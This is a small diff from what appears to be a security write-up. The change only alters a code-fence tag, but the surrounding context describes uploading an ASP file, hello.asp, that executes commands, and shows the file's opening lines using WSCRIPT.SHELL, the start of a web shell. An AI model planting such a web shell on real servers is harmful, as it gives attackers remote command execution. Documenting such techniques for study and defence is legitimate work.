@@ -681,7 +681,7 @@ Armed with this knowledge, we can upload a simple ASP file that executes command
 
 <div class="filename"><span>hello.asp</span></div>
 
-```asp
+```
 <%
 Set oScript = Server.CreateObject("WSCRIPT.SHELL")
 Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
